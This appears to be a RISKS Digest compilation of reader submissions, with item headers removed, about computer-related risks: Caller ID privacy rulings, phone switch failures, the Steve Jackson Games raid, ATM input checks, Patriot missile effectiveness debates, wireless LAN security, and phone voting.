Welcome to VOLUME 10.  RISKS will be beginning its SIXTH year on 1 August 90,
although it will soon go into a first-month-of-the-summer sporadic mode until
then.

For FTPers who previously complained about the unfriendly sort order produced
by the directory commands, you probably noticed that we recently switched the
archive issue-number file name extensions to double digits (e.g., <A HREF="/Risks/9.01.html">RISKS-9.01</A>,
02, 03, etc.)  and the volume summaries to RISKS-i.00, for i=1 to 9.  Beginning
with this issue we now have double-digit volume numbers for volume 10 and
beyond, but the original single-digit volume numbers remain for the first 9
volumes.  Beginning with this issue, ALL issue numbers will appear as two-digit
numbers, even in the headers.  (No volume has exceeded or will exceed 99
issues, a decision that ensures that the volume summary issues will be not much
larger than <A HREF="/Risks/9.98.html">RISKS-9.98</A> = <A HREF="/Risks/9.00.html">RISKS-9.00</A>, which was the largest yet.)

Astoundingly, there is always someone going back to get the early issues, which
affords an interesting chronological perspective of where we've been and how we
got to where we are now.  The historical archive also gives lots of clues as to
what we need to do better in the future...

Thanks for your patience through the multiple-copy ordeal.  The various
manifestations of it all seem to have been rectified on my end, although I
still hear reports of problems elsewhere.  PGN

pp. 45-6, May 23, 1990):

"When [Word Perfect] 5.0 shipped in May 1988, the company underestimated
the demand for telephone support.  Although it bought additional phone
lines, traffic was so heavy that calls to the support department brought
down the toll-free systems for the state of Utah, including phone systems
for American Express, Delta Airlines, and the Latter Day Saints Church."

Here are excerpts from a page 1 story in MILITARY AND AEROSPACE ELECTRONICS,
vol 1 no 5, May 1990:

VIRUSES COULD CRASH U.S. BATTLE SYSTEM by Lisa Burgess and Tobias Naegele

WASHINGTON - Computer viruses could crash critical battlefield command and
control computers,  according to a draft version of the Army's new Command
and Control Master Plan.  The report says the Army's Maneuver Control 
System, touted by developer TRW Inc. as the "integrating node" of the Army's 
command and control battle plan, is vulnerable to sabotaged software 
designed to undermine and disrupt operations.

... The four-page subsection, titled "Subversive Software" and buried 10
items deep in a section on camouflage, warns that "contractor-developed
non-developmental item (NDI) and `homegrown' software each present unique
[software surity] problems that must be addressed."

Generated by the Army's Combined Arms Combat Developments Activity at Fort
Leavenworth, Kan., the report raises three questions about the potential for
software sabotage to damage the $1.3 billion MCS battle management network:

- Could virus software implanted in the system during the design phase attack
  MCS at a later date?

- Could an agent introduce a virus during combat by surreptitious access to a
  workstation?

- Could an enemy use a captured workstation to introduce a virus over the radio 
  network?

"Under its present configuration," the report states, "the answer is yes with
regards to MCS."

... Defense contractors say any system using the sort of off-the-shelf hardware
and software utilized in MCS and ATCCS --- the Army Tactical Command and
Control System --- is potentially vulnerable to virus attacks. ...

Court Rules Against Caller I.D.: Bell of Pennsylvania's caller-identification
service is an invasion of privacy and violates the state's wiretap law, a state
court ruled.  The decision reverses an order by the state Public Utility
Commission allowing Bell to offer the service.  The service would let people
know who is calling before they pick up the phone, even if the caller's number
is unlisted.  Several other regional phone companies already offer the service.

Services Identifying Caller Held Illegal In Pennsylvania,   By Keith Bradsher

A Pennsylvania court ruled yesterday that services that identify the telephone
numbers of callers represent an illegal invasion of privacy.

The verdict was the first in the nation on the legality of such services.  The
five judges of the Commonwealth Court, a mid-level state appellate court, ruled
unanimously that caller identification services ... violate Pennsylvania's
wiretap law.

All five judges found that the services violate the law even when telephone
companies allow some customers to block the release of their telephone numbers.
And the court ruled by a 3-2 vote that the services violate privacy protections
offered by the Pennsylvania Constitution.

"In the framework of a democratic society, the privacy rights concept is much
too fundamental to be compromised or abridged by permitting Caller*ID," Judge
Doris A. Smith wrote in the majority opinion....

But Bell of Pennsylvania criticized the ruling.  "Because of this decision,
Pennsylvanians are being deined a service they eagerly want and badly need -
a weapon against harassing, threatening or obscene calls," [a spokesman said].

	Three Options for Panel

The Commonwealth Court hears appeals of decisions by state and local
administrative bodies in Pennsylvania, and its decisions may be appealed to the
Pennsylvania Supreme Court.  John F. Povilaitis, the chief counsel of the
Pennsylvania Public Utility Commission, said his office would review
yesterday's decision and make a recommendation to the commissioners within a
few days.

[He] said the commission had three options:  to ask [for a rehearing], to file
an appeal before the Pennsylvania Supreme Court, or to allow the decision to
stand.

Bell of Pennsylvania was not named as a defendent in the case.  But [it] said
it qualified as a party [and could appeal if the PUC chose not to].

Bell ... filed with the commission on June 18, 1989 for permission to offer
caller identification.  The commission approved the filing on Nov. 9 and the
company scheduled service to begin Jan. 9.  But a Commonwealth Court judge
blocked the service pending judicial review.

The suit was filed against the P.U.C. by the state's Office of the Consumer
Advocate, the [ACLU], the Pennsylvania Coalition Against Domestic Violence
and the Consumer Education and Protective Association.

[Caller id is now] widely available in [five states] and on a limited basis in
[three others] ... according to ... a spokesman for Bell Atlantic Corporation,
the parent of Bell of Pennsylvania.  Phone companies in nine other states and
Washington are seeking to introduce caller identification.

Long-distance companies, including [AT&amp;T], also offer caller identification to
some businesses with 800 and 900 numbers.  Yesterday's decision ...  did not
address whether long-distance companies should stop providing information for
Pennsylvania callers.

"We have to see how, if at all, this ruling affects AT&amp;T," said ... a spokesman
for the company.

	Privacy Issue Cited

Bell Atlantic and other defenders of caller identification have argued that
the services discourage obscene callers and protect the privacy of people
receiving calls by allowing them the choice of not answering.  But the court
ruled explicitly that the privacy of people making calls is more important.

The court found that caller identification services function as call-tracing
devices, which under the Pennsylvania wiretap statute may be used only under
certain circumstances.  The court noted that Pennsylvania requires the consent
of all parties before a telephone conversation may be recorded.

As of December, there were 15 other states with similar requirements.  The
remaining states and Federal law allow taping with the consent of one party.
But [FCC] rules require that all parties to an interstate or international call
be aware they are being taped.

The Pennsylvania wiretap statute contains wording similar to the Federal
wiretap statute.  Bills are pending in the House and Senate that would amend
the Electronic Communications Privacy Act of 1986 to make caller identification
explicitly legal while requiring that telephone companies give customers the
option of blocking release of their telephone numbers.  A subcommittee of the
Senate Judiciary Committee has scheduled a hearing for June 7 on caller
identification.

                 [Because of the remarkably complex tradeoffs between 
                 defensive functionality and offensive violations of rights,
                 this item seems worth including in its entirety for its
                 intense educational value.  PGN]

The Massachusetts Institute of Technology runs its own 5ESS switch to provide
telephone service on campus.  This has significant benefits, including many
different telephone classifications (office, dormitory, etc), a modem pool, and
ISDN phones in the offices which pay for them (most do).

This week, I discovered what I consider a serious problem, however.  A friend
was at the Massachusetts General Hospital (MGH) for surgery.  (I'll save you
the suspense: the surgery went well.)  I wanted to call and check on him to see
how the surgery went.  I called the hospital's main number, and was transferred
to his room, except the phone was busy, so the operator gave me his phone
number.

The next day, I attempted to call his room, only to be greeted with "I'm sorry,
but your call cannot be completed as dialed...."  I thought about the
situation, and after placing a call to the MGH operator, discovered that my
friend was in a brand new building with a brand new exchange all its own.  I
called the MIT operator, who told me that the number I was trying to reach was
in Petersburg, over a half hour away (I can see MGH from my room).  I finally
convinced her that this was a number at MGH, but she told me that she couldn't
connect me.  My phone is only able to make local calls, so I called a friend
who works in the same office as the people who run the switch.  They couldn't
make the call.  In other words, neither the operator nor the top class of phone
could make the call.

Today, I called MIT's help line, and described my problem.  Within several
hours, my theory was confirmed.  The switch simply didn't know the new exchange
existed.  It turns out, that as a "client," MIT doesn't get automatic updates
when new exchanges are created.  Without this information, the switch has no
clue how to bill the caller, or even if it should let the caller make the call.
So it assumes the worst case, and disallows anyone from making the call.  The
switch had to be manually programmed with the necessary information about the
new exchange.

This worries me, as someone who isn't as familiar with telephone switching
equipment might not have known what caused it, assumed it was his/her fault,
and been denied service because of it.  It is surprising, to me that our switch
is not configured to take updates of this kind of information automatically
from the New England Telephone switches it talks to.  I was trying to call a
hospital; fortunately it was not an emergency.  My workstation has dynamic
nameservice; my doesn't my telephone switch?

Some little while ago, Risks published the report of a flight crew landing an
airliner in Britain after a very difficult time with wind readings of 100+
knots and repeated equipment failures (in a "glass" [computerized] cockpit).
There is an interesting sidelight on this in the May 2 issue of Flight
International:

	CAA appeals for CHIRP pilot to step forward

	The UK Civil Aviation Authority is publicly appealing to
	an unknown pilot to file a Mandatory Occurrence Report
	about a serious digital cockpit systems failure which it
	is unable to investigate, because the airline pilot
	involved reported it through a confidential reporting system.

	Investigators and airline maintenance staff have no access
	to details of the apparently first-time incident.  The MOR
	would allow the aircraft to be identified and its cockpit
	systems failures identified...

	[Recap of incident, as reported by pilot.]

	The confidential human factors incident reporting program
	(CHIRP) was designed to encourage pilots who have experienced
	a potentially dangerous incident because of human error to
	report it without fear of any disciplinary repercussions.

	It is unclear why this pilot used CHIRP, because there is no
	indication of human error -- only bad weather and systems failure...

	[More recap.]

One really has to wonder just what really went on on that flight.  Use of CHIRP
might seem appropriate to a pilot fearful of management reaction to criticism
of electronic aircraft, but as a result the people who want to investigate the
problem are hamstrung, doubts are cast on the accuracy of the report, and if it
*is* factual, that aircraft is still in service and potentially a lethal hazard
to crews and passengers.

Subject: Re: Debate on SJG raid in comp.risks

Re: Sherwood, <A HREF="/Risks/9.96.html">RISKS-9.96</A>:

To the best of my understanding, this account is correct except for trivial
details (not a footlocker, but some filing cabinets were broken open in the
account SJ himself wrote).

Re: Von Rospach, <A HREF="/Risks/9.97.html">RISKS-9.97</A>

&gt; the person working on for Jackson Games was a former Legion of Doom member...

This first part of this also appears to be true -- Loyd was apparently
associated with some bunch of crackers sometime in the past, and apparently
discussed some of the stuff he was doing with Cyberpunk with them, in the way
of reality-checking.  However, Cyberpunk was certainly *not* a "manual on
hacking" -- I haven't read my copy yet, but I'm quite certain the game rules
don't go into details of breaking computer security -- it just has abstract
security programs and "cracking" programs as things that exist in the game
world.  These things also exist in cyberpunk novels, which is why they're in
the book.

&gt;If you're running a BBS that's supporting a group of system crackers, you are,
&gt;at least, contributory to felony crimes... 

The problem was that SJG *was* clean, as far as I know -- the Secret
Service just went overboard in their search for "contamination".  I
believe guilt-by-association is not a tenable legal theory in the US.
Grounds for some amount of suspicion, yes.  But search and seizure?

&gt;&gt;Or does it indicate that games which involve "hacking" are subject to ...
&gt;Not if the Legion of Doom angle is true.... 

The Legion of Doom connection appears to have been there, but very tenuous.
The Feds seem to have been unable to draw the line between fantasy and reality,
and appear to have been operating under a "guilty until proven innocent"
premise as far as the seizure of equipment went.  As far as I know, the Secret
Service had no direct evidence that SJG or the BBS had *anything* to do with
their case -- mere proximity to the principals seems to have triggered the
raid.  I would expect that they would have done more research before swooping
down and carting off someone's business equipment.

I can understand how the raid happened, and even sympathize somewhat with the
motivations of the Secret Service, but I think that they definitely stepped
over the line here.  One of the principles of the law in this country is that
the innocent shouldn't be harmed in the pursuit of the guilty.
                                                                  ---Walter

The chance of GURPS Cyperpunk being used as a manual for computer crime is very
slight indeed.  In Cyperpunk fiction, a hacker's interface with the computer
network he or she is trying to operate in is an actual physical connection with
the computer.  This connection is usually in the form of a direct link to a
person's brain through jacks surgically implanted in their skull.  It is my
understanding that Steve Jackson Games used the same method of interfacing with
computers in GURPS Cyperpunk.  This would make it a little difficult for a
person to use the game rules a handbook for crime.  Unless they had a friend
real handy with tools...:-).

 In RISKS 9.96, Richard Muirden writes of his experience with $89m showing up
in his bank account; his bank blamed him for keying in the amount at the ATM.
He went on to wonder about the range checking that might or might not be
employed at the ATM to catch "such obvious erroneous data".  It is my
experience that there is, indeed, NO such checking performed--at least at one
institution, at one time.
 A few years back, my credit union installed an ATM machine; as part of the
hoopla surrounding the event, they had a demonstration where members could
"practice" on the machine, using a card provided by the demonstator.  I, being
the obnoxious sort, made use of the opportunity to determine an empirical
answer to the question of range checks.  I cheerfully deposited the amount of
$99,999,999 in the account.  The demonstrator was rather worried when I showed
him the receipt (oops--I meant "transaction record"); it seems that they were
using a live account for the demo, which meant that all these phoney
transactions would show up on the balance sheets at the end of the day!  I did
hear later that the trouble caused was minimal, but they did have to jump
through some hoops to make sure there were no ripple effects caused by that
$99m.
 P.S.--My personal feeling is that any non-zero deposit is an "obviously
erroneous value"; I don't like giving my money to a machine in exchange
for a worthless transaction record.                                    Andy

During the Vietnam war (conflict?), the F-111 was sent into combat.  There are
three modes to the terrain following equipment - soft, medium, and hard.  These
modes describe how hard the computer climbs or dives the aircraft - the number
of G's exerted on the crew.

Several planes were lost shortly after deployment.  Another crew reported that
when the hard mode was used, there were times that the crew was helpless - the
computer performed 5 G climbs and dives over some of the high hilly terrain in
vietnam.  The plane would climb HARD and dive HARD, climb and dive, etc.; due
to the G-forces, the crew was not able to control the plane, making it a good
target for the enemy.

Being air-sick is nothing compared with being shot down because you can't take
the airplane's controls out of automatic mode.

&gt;  This is so serious that when some pilots arrived at the target site, they had
&gt;lost all faculties of analysis, and as a result the U.S. Air Force has decided
&gt;to abandon at least partially the concept of automated piloting for very low
&gt;altitude flights. "

Ahem...  I hope someone tells the crewmembers of USAF F-111's, RAF Tornados,
and any allied LANTIRN-equipped aircraft (among others).

It's ludicrous to believe that any airman would allow his pink flesh to be
routinely thrown at the ground without some control (or at least a cross check)
of the system.  I would suspect that's the real reason to "abandon" the
concept.  Don't forget, in the USAF at least, airmen make the decisions on what
technology to pursue.

As for airsickness, some people are susceptible, others are not.  Those who
are, are mostly weeded out during the qualification process.

By the way, the article should have specified "...the concept of _manned_ 
automated piloting...."  The concept of unmanned automated piloting is alive
and well (vis. Tomohawk cruise missile).

Note that according to press reports, the JSTARS tracking aircraft is being

The debate about what the apparent effectiveness of the Patriots demonstrates
itself demonstrates the unfortunate way in which too much debate on various
important issues is carried on.

	1.  The Patriot was intended to be a close-in defender of important
		military sites.  It was apparently never intended to be used
		to defend cities.

		When you are protecting a relatively small, fairly "hard",
		military site, knocking an incoming warhead off target by
		even a fairly small amount is an excellent defense.  Obviously
		this is NOT the case when you are defending a spread out,
		fairly "soft" target like a city.

	2.  "If the warhead had chemical agents, blowing it up with a Patriot
		just makes things worse."  Simple logic tells you that this
		is unlikely to be true.  There is an optimal height at which
		to release poison gas:  Too near the ground and it doesn't
		spread out enough, too high and it dissipates before having
		an effect.  The designer of the warhead will try to hit the
		optimum.  Unless he does a really bad job of it, AND you are
		very unlucky, you can at worst leave things unchanged by
		hitting the warhead.

The arguments in (1) and (2) are typical of one class of responses by those
who have an emotional attachment to the position that sophisticated weapons
don't work:  When the systems SEEM to work, that's only an illusion - they
don't REALLY work after all.  (I'd be interested to know what those who make
these arguments think the Israelis have in mind in deploying and using
Patriots.)

The arguments of those who have an attachment to these weapons are pretty much
the same, if turned around:  See, they work so they are effective.  The
evidence - so far as we can tell through the noise of battle combined with
censorship - is that these weapons really DO work, in the sense that they do
pretty much what their builders claimed.  What is by no means clear is that
they are as effective at actually doing something USEFUL, as has also been
claimed.

A more subtle anti-smart-weapon argument takes the form:  "Well, yes, these
things work, but we always knew they would - it's those OTHER things that
don't work."  The difficulty with such a claim is that anyone can make it
after the fact.  Certain people - David Parnas is certainly one, as he has
written about many of these issues - can legitimately and honestly say that
they have never said, say, that close-in defenses can't work, they've only
argued against some more grandiose schemes.  However, my own experience has
been that most critics had very general complaints about these systems.  "They
won't work in the heat of battle."  "The sand will destroy them."  "RFI among
all the planes in the sky will make them all do crazy things."  And so on.
In effect, these people made a prediction:  When used in battle, these devices
would not perform as well as simpler weapons.  As far as we can tell at this
point, that prediction was just plain wrong.

I must admit that I made such predictions myself.  Having seen the way large
complex systems fail, especially having seen how getting the last 10% can
destroy the 90% you already have, I always read the criticisms with great
sympathy.  If you had asked me a couple of months ago whether one could
expect to hit rockets coming essentially straight down at Mach 4, in the
middle of a desert, night after night, with all sorts of other clutter in the
sky, I would have said "no".  (It appears that Parnas knew better.)

A final argument, seen on both sides, is essentially one of extrapolation:
Sure, you can hit SCUDs, but what about the next weapon?  Sure, a Stealth
fighter can hide from standard radar, but what about two-point radar?  To
which the only answer is:  Weapons are always changing.  They have been since
the beginning of time, and they always will be.  The best you can do is match
what the other guy has now, or will likely have in the near future.  In the
long run, both your system and the other guy's will be obsolete; it's a never-
ending process.  At the moment, the evidence is that the smart weapons CAN be
built and used, and can best "not so smart" weapons.  Things could change.

The same argument from the other side is:  We can build a Patriot, so we can
build an SDI.  Well, maybe - but that's a very big leap.  On the other hand,
the claim "We can build a Patriot, so we can build an ABM system that will
keep us safe from attack by any small power (i.e., an attack with no more than
a few hundred warheads)" is now at least reasonably arguable.

It's been said that the first victim of war is the truth.  There are plenty
of issues here - political, social, technological, military - that need to be
examined with some degree of rational thought.  Sloganeering doesn't help.
Refusing to look at the evidence doesn't help.  Refusing to change one's mind
no matter WHAT happens doesn't help.

One powerful argument against SDI is that you need confidence that the system
will work effectively the first time it is used against a full attack. The
Patriot missiles, even if they were 100% effective against SCUDs, can provide
no basis on which we can be confident that a different system, deployed against
different targets, would be successful.
 
In general, we may be able to *achieve* very high success rates with complex
systems, but this is a very different thing from being able to *predict* a high
success rate with any convincing evidence. When we certify a new
safety-critical system for use, we predict that the failure rate will be
acceptable; evidence that past systems have achieved acceptable error-rates is
almost useless for justifying such a prediction, unless the new system is a
very well-controlled evolution of the earlier system. This is extremely rare.

I should preface this by saying that I agree with Dave Parnas's most basic
point:  recent Patriot successes say little about effectiveness of more
ambitious antimissile defences.  However, some of his arguments are weak...

&gt;...The Patriot missile itself is launched on a path that will
&gt;intercept the path of the incoming missile ...
&gt;and has a very simple homing system that is effective when (and if) it
&gt;gets near its target.  Were the target missile to change course drastically
&gt;after launch, the Patriot missile would end up somewhere else...

I believe this is erroneous.  Patriot is guided, under control of the launch
system, all the way up.  It's not a question of firing it on a predetermined
trajectory in hopes that it will get close enough to home.  Even Patriot's
homing is actually controlled by the ground computers; the missile itself has
no brains to speak of, just a receiver system that picks up radar reflections
off the target and relays them to the ground for assessment.  In principle, a
drastic course change by the target can be matched by a similar change by the
Patriot.  How well this actually works is an open question, since it hasn't
been tried in combat.  (The recent incident of an accidental launch against
aircraft is silly as a test case, since the Patriot system reportedly was in
antimissile mode and thus probably wasn't expecting evasive action.)

It occurred to me a little while ago, in fact, that we may never know how well
Patriot would work against aircraft.  Aircraft can be shot down by lots of
systems, e.g., other aircraft, while Patriot is the only operational
antimissile system.  I'd expect that the Patriot batteries in the Gulf have
firm orders to ignore aircraft, and it would take a really drastic change in
the situation to get those orders changed.

&gt;... The development and manufacture tooling stage of the Patriot
&gt;was completed in 1980...  The SDI program was
&gt;not announced until 1983.  There was no SDI software technology to be applied
&gt;to Patriot...

While the original development of Patriot was completed about a decade ago,
much of the antimissile capability was in the form of retrofits.  According to
Flight International, full production of Patriots with the current antimissile
capability started in 1989.  So there was some opportunity for application of
SDI software technology, although I do not know whether that actually happened.

&gt;... Terminal defense systems can have an operator who makes
&gt;decisions that would have had to be automated in the space-based system.

I've never understood why it is fundamentally impossible to put "man in the
loop" for space-based systems.  I'd be interested in seeing this explained.
There is clearly a serious shortage of time for decision-making, but the
same is true of terminal defence against tactical missiles -- which have
much shorter flight times than ICBMs -- and short-notice decision-making
in combat is both possible and practical, as any fighter pilot can testify.

&gt;... The SCUD was first deployed about 1965 - Patriot about 19 years later.
&gt;All RISKS readers should think about the advances that we have seen in 19
&gt;years.  It should come as no surprise that the Patriot can sometimes destroy
&gt;missiles that were deployed when its development began...

As far as I am aware, it should still be capable of destroying most missiles
that were deployed yesterday.  Maneuvering warheads remain extremely rare
and rather limited, and most other forms of countermeasures don't work in
the terminal phase.

Some notes on the Patriot system:

You can "program" by designating areas where all planes are safe, or a plane
should be assumed a bogey.  The programming going on now is probably on this
level, where they are trying to create areas not to shoot at what's in them.
There are things that could be used, but I don't think anything provided
directly or played with in the past.

I know that a good way to avoid Patriot missiles is to drop below their radar
height.  I would also assume that if I had accidently shot at a friendly, I
would give them a call and turn off my radar.  Even if neither of these
occured, our pilots are keenly aware and concerned about the Patriot system and
how to avoid it (and indeed all air defense, ours and theirs).  And there are
other ways to beat the Patriot, such as being in a "safe zone" that change
daily, which friendlies, and only friendlies, would know.  I don't think what
we've seen tells me a lot.  SCUDs are a lot different than planes, while they
travel straight, they travel darn fast for a plane.  Our planes should be able
to not get hit even if shot at, particularly if there are no other planes or
AAA.

The real power of the Patriot appears to be the ability to deal with a large
number of planes, some targets, some not.  If these friendlies came back
without their transponders on, in the wrong direction and altitude, the right
mistake was to shoot at them.  Until you know this information, it's hard to
judge what was going on.

In RISKS 10.83, Tom Lane quotes an article from the New York Times stating that
Apple is installing (or at least reserving the radio frequencies for) a
wireless 10 Mbit/sec LAN.  Tom observes that such a broadcast LAN requires
protection.  I agree.

Wireless LANs are being standardized by the IEEE and IEEE 802.11 was recently
formed for just this task.  The people working on this standard also agree that
sensitive data must be protected on such a LAN.  IEEE 802.10 (Standard for
Interoperable LAN Security) is developing standards for just this purpose.  (Of
course, it would be up to each company to decide whether all its data is
sensitive.)

Tom Lane also says, "(But if they are going to support 10Mb/sec data rates, the
encryption would have to be fairly weak, methinks.)"  On this, Mr. Lane and I
disagree!  10 Mbit/sec is the data rate of the "backbone."  If encryption is
placed at each wireless LAN station, the encryptors can run at a significantly
lower data rate.  The station cipher device only needs to decrypt those frames
which are addressed to that station.  Of course, this includes broadcast
frames, appropriate multicast frames, and frames addressed to that particular
station.

In the IEEE 802.3 (Ethernet) world, there are encryption devices that work just
this way.  I will refrain from turning this into an advertisement for such
products, but they are available with the DES algorithm and with NSA
"proprietary" algorithms.

Reading the notices about the approach of broadcast LAN's reminded me of a
semihumorous incident that happened about 2 years while I was doing some
consulting for a "local" oil company.  We were preparing a SCADA system for
Oilpatch, Texas and had the entire thing staged on the 17th floor of a TALL
building in downtown Houston.  (That ought to narrow the oil company down to
about 20 or so.)  All of the remote telemetry units were communicating with the
master station computer via low power Johnson radios, and I had made sure that
we had dummy loads on all of the antennae so as to cut down the range of the
transmissions.  This screwed up SWR's and about everything else, but we could
adjust the transceivers and get decent communications - most of the time.
Sporadically, we would get bursts of errors for seemingly no reason, and then
good comm again for a while.  I hooked up data analysers, etc, and could see
the junk that was being injected on the frequency, but couldn't identify it as
any of the other equipment that we had operating in the area.

I remembered an old microwave hand showing me how you could kluge in a
telephone handset on a circuit and listen to the "noise", often identifying it
with ease when all of the sophisticated techniques had failed.  Out of
desperation, I rigged up a speaker at the master station and listened to the
buzzings of the remotes answering the master.  Much to my surprise, I heard
some poor fella in a delivery truck complain about "there's that doggone
buzzing sound again" to his dispatcher at the same time that our comm
efficiency dropped to zero!

I felt sorry for him, but I didn't have enough radios laying around to set up
with another frequency, so we just kept testing with the occasional comm burps
until we shipped the system.  I did leave the speaker hooked up, though.  It
was kinda fun listening to all of those guys swear at the strange interference
that they were getting.

In <A HREF="/Risks/10.83.html">RISKS-10.83</A>, Tom Lane points out the security risks of wireless
(radio-based) LAN technology.  Actually, wireless LAN's have the potential 
to be _more_ secure than traditional "wired" LAN's.  

One currently available wireless LAN product uses spread spectrum
communications. (It is interesting to note that, for the radio frequencies used
by this product, the FCC mandates use of spread spectrum).

While I am not an expert on spread spectrum communications, my understanding of
the technique suggests that it offers both increased protection against
eavesdropping as well as resistance to jamming, when compared to traditional
radio broadcast techniques.

 One other possible risk is to those with pacemakers or other electronic
medical devices (such as implanted pumps or heart monitoring devices).

         	USER-HOSTILE VENDING-MACHINE PROGRAMMING

My wife stopped at a Post Office yesterday to buy some stamps, and had a run in
with some technology.  They have a vending machine for stamps, which takes
old-fashioned paper money of up to $20 denominations.  To prevent you from
using the machine as a change machine, the bill-counter attachment is
programmed to give you change of a very limited amount, forcing you to spend
about 2/3 of whatever cash you insert.  She tried a $10 in this USPS
slot-machine.

Not until she had put money into the bill-counter would it tell her that the
selection was sold out by saying so on a display above the selection buttons.
There were no little soldout lights by each sample like on some types of
machines, and the display would not activate until you fed some cash into this
one-armed bandit.  Worse yet, even for a sold-out selection, you had to put in
as much money as the selection costs to find out that it was sold out -
otherwise the first/only message you got was "Need $.cc more".

Fortunately the common stamps were in multiple channels - unfortunately these
were all sold out also.  So here's the rock and the hard place.  There is no
sold out lights, no display on the panel without some money, no indication that
a particular selection is sold out til you have put in enough money (which can
be up to $25.00), and NO refunds without purchase.  Additionally, you have to
spend about 70% of the cash you put in.  Goldie settled on a bunch of 15c
postcard stamps that can be used next week when the letter rates go to 29c.

The risk here is that this machine is meant to be used by the general public,
and many of them are likely to be using it for the first time.  It's operation
and behavior differ greatly from the more normal soda and candy machines,
unfortunately - with much greater amounts of cash involved than with a Snickers
bar.

The bill-collecting portion appears to be an added-on unit, with no feedback
from the dispensing unit regarding product availability until AFTER the money
part has received the purchase price for that selection.  Extra programming
added in later to prevent the machines use as a change machine (for the bus
stop outside), did not take into account sold-out selections - which should
have been checked first, with or without money.  I believe that this unit was a
retrofit on an old machine, with additional programming adding later making it
a one-of-a-kind unit which acts like it didn't get much QA on the
customization.

SUMMARY:

  No (sold out) light always on.

  No light if you push the button without money to test.

  No light even with money entered, unless the amount is enough
	for that particular selection.

  No refund without purchase.

  No tag backs, no refunds, all sales final - gotcha.

I kinda thought you would appreciate the risks of a hostile-programmed vending
machine.  Especially one that would be in an environment like a post-office,
where people wouldn't necessarilly use it every day, and with a high percentage
of first-time users, who could get skunked by the over-zealous application of
the rules.

&gt;It's ludicrous to believe that any airman would allow his pink flesh to be
&gt;routinely thrown at the ground without some control ...

I can think of one possible legitimate motive for this, which makes it a bit
less ludicrous than it first sounds.  The way for aircraft to survive in combat
is to get as low as possible.  In a real war, with serious and capable
opposition (it is not clear whether Iraq qualifies at present), a lot of flying
would be done at altitudes circa 50 feet.  The trouble is that flying at 50ft
is very different from flying at 500ft, which is a more usual training altitude
for the USAF.  The South African air force trains at 50 ft.  So do the
Israelis.  But the USAF considers training at realistic altitudes to be
unacceptably dangerous for peacetime.  The intent might have been to get the
benefits of the low altitude without the political difficulties of relatively
dangerous peacetime training or the fearful attrition rate associated with
having to learn new basic skills while being shot at.

Phil Zimmerman (prz@sage.cgd.ucar.edu (303)444-4541 ) is a computer security
consultant working with the Voting by phone foundation on public-key
cryptographic protocols used for voter authentication and privacy.  His group's
scheme would prevent the government from entering bogus votes, using the PINs
of those who had not voted at the end of the election, to use PGN's example.
              
For those who doubt that a PIN could not be anonymous I suggest drawing them
from a hat (perhaps using a device like we used to select gumball prizes with).
The other worries, like caller ID and wire-tapping can be avoided by simply
voting from any other phone.  I'm sure I pass a dozen a day.
              
Paranoia is justified, but apply it to how we vote now, as well.  Don't you
think that a government that can photograph your license plate from outer space
can install a tiny video camera that watches how you vote in a booth?
              
Please read our brochure (E or regular mail) before picking at a system you
don't have full info on.  Contact Phil for his ingenious cryptographic system,

&gt;Each voter is given an id number to vote, but is told that the number is either
&gt;positive or negative.  Suppose there are two candidates, Alice and Bob.  If the
&gt;number is negative, a vote for Alice is actually counted as a vote for Bob.

Now suppose there are four candidates.  We give each voter a complex number X.
A vote for Alice is (1+i)X, while Bob is (1-i)X, Carol is (-1+i)X, and Ted is
(-1-i)X. For up to 16 candidates we issue each voter a quaterion, but this has
the drawback that only people with graduate degrees in mathematics are able to
vote.

I believe that phone voting is trying to solve a problem that is already solved
pretty well.  The goals are 1) make it convenient for the voter to vote, 2)
make it impossible, or nearly so, to determine anyone's vote, and 3) make it
very difficult to falsify results.  I argue that 1) is already met closely
enough that the virtual sacrifice of 2) and 3) in the vote-by-phone schemes are
not justified in the least.

A thought on the RISKS of evaluating the Patriot system's performance:

The arguments I've heard in the digest and in the media lately seem to leave
out an important aspect of this discussion.  By pointing out numerous successes
in the Persian Gulf theater, proponents of this system, proponents of complex
weapons systems, and even advocates for SDI are now implying that ALL of their
Patriots, complex weapons systems, and SDI systems will function *as promised*.
The question here has never been whether the Patriot can shoot down rather easy
targets.  The question here (and the question in evaluating the
cost/performance ratio, practicality, and effectiveness of any weapons system),
is whether the Patriot system can function in the role for which it was
designed.

If the Iraqi's had effective ECM operating, radar busting aircraft deployed,
and were attempting coordinated attacks on these cities with maneuverable
aircraft, would the Patriot be as effective as it was designed to be?  The
results from the Persian Gulf theater are inconclusive at best.  The Patriot
system's design advantages and sophistication, the very aspects of the system
that make it so expensive, are still relatively untested in combat.  These are
the aspects of the system that have been used to rationalize it's development
and deployment costs.

If GM claimed that it's new Family Van Mk IV was amphibious, would you label it
a magnificent success just because you saw 30 of them cruise down the highway
at 50 MPH?  If all you need is a Family Van that can cruise down the highway at
50 MPH, why not save a few million and go for the Family Van Mk III that
doesn't claim the amphibious capabilities.

I do not feel that the Patriot's "amphibious" capabilities have been
demonstrated here.

&gt;I'm awestruck that they're willing to reprogram the Patriot [...] right
&gt;in the middle of the war! [...]

   Wartime modification and upgrade of systems is a common and time honored
practice by military units.  Experience is gained on a daily basis and both
sides modify both their systems and tactics to make use of it.  If one can't
adapt, one is placed at a tremendous disadvantage.  It would likely be deemed
unacceptable if modifications could NOT be made in this timeframe.

&gt;[...] Patriots may never again be as useful as they are being in this war,
&gt;because "now that their capabilities are known, it will be trivial to

   There are large inventories of missiles with current and relatively outdated
technologies.  The SCUD itself is considered an archaic weapon.  The Patriot
will have a place in defense against these weapons.  Patriot upgrades, both
software and hardware, will likely increase effectiveness against more advanced
threats.  Certainly current assessments of their capabilities will be of
limited usefulness in estimating future performance.

karn@thumper.bellcore.com (Phil R. Karn) writes:

&gt;Even the Pentagon admits Patriots are of little use against SCUDs armed
&gt;with chemical warheads since they would merely disperse the chemical over

   If such dispersal were guaranteed, then the Patriot would be an effective
countermeasure.  Chemical weapons are effective only when chemicals can be
delivered with sufficient concentration.  Isolated high altitude airbursts of
the chemical containers will cause the material to disperse as it descends,
this lessening concentration and reducing effectiveness.

   One of the things we've seen with the Patriots is that some but not all
intercepts disable warhead arming.  Thus some intercepted SCUDS hit the ground
without detonating, but some explode anyway.  This has major implications for
an SDI terminal area defense against nuclear weapons for which a nuclear
near-miss may be as good as a direct hit.

Until about a year ago, my brother worked for Teledyne Brown Engineering in
Hunstville, on contract to the Army Ballistic Missile Division.  He claims
credit for a small part of the SDI technology that was retrofit to the Patriot,
although for obvious security reasons will not say more.  He has confirmed,
however, that SDI technology was used in some of the follow-on modifications to
both the Patriot missile itself (rocket motors) and the command/control radars
